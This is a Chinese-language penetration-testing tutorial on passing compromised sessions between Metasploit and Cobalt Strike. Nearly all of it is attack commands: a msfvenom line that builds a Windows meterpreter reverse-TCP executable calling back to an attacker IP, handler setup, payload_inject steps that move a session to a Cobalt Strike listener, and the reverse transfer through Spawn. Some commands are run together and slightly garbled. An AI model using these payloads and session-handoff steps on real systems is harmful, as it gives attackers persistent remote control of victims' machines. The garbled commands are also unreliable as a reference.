> `msfconsole`和`Cs`是我们最常用的两款渗透神器。每款工具都有自身的优点和缺点。如cs用于强悍的图形界面，完善的团队协作。但是功能上面就没有`msfconsole`强悍了。如何做到两者相互配合呢？

# MSF上线给CS

当msf得到了会话的`session`。如何将其传递给cs呢？我们先用kali生成一个`shell`

```
msfvenom -p windows/x64/meterpreter_reverse_tcp lhost= 192.168.123.74 lport= 5555
 -f exe > kali.exe
```

![](../Images/efdcedf43216fd9e8bc0ddf5a8dcd120.png)在msf中配置监听

```


use exploit/multi/handler 192.168.123.74
5555


```

![](../Images/9c758eb247ccdabf0ec3fa412af86efe.png)**配置cs**

在CS中创建监听器监听器类型：`windows/beacon_http/reverse_http`Host修改为对应cs的IP，监听指定端口，等待MSF发送。

![](../Images/2d91bb0be2486707259764563cded31f.png)**从msf中转移会话到cs**

```
#使当前会话到后台允许

# 使用payload_inject模块,执行之后会在本地产生一个新的Handler
local
/payload_injectset
 payload windows/meterpreter/reverse_httpset
 LHOST <CS_IP>set LPORT <CS_Port>  #这里的端口填写cs的端口
set session <Session_ID> #指定id
#设置MSF不启动监听,不然MSF会提示执行成功,但没有会话建立
set disablepayloadhandler true


```

![](../Images/2924171ae4e5370a92d30cb6e73ccb7a.png)

运行后，我们到cs中就可以看到转移的会话了。

![](../Images/c8784c1ec57de22925b88e28cd66cdd6.png)

# CS会话转移msf

我们先在msf中配置参数

```

use exploit/multi/handlerset payload windows/meterpreter/reverse_http # 不要用64位
set
 lhost <MSF_IP>set lport <MSF_Port>   # 设置任意端口进行监听


```

然后再`Cs`中配置监听，效果如下：

![](../Images/2168cae461ac69746e121927a4fe63cc.png)

在`CS`中右键会话，点击`Spawn`，选择MSF的监听器，成功得到会话。

![](../Images/e8787f4a5f43fb46df144c22aa2f0d55.png)
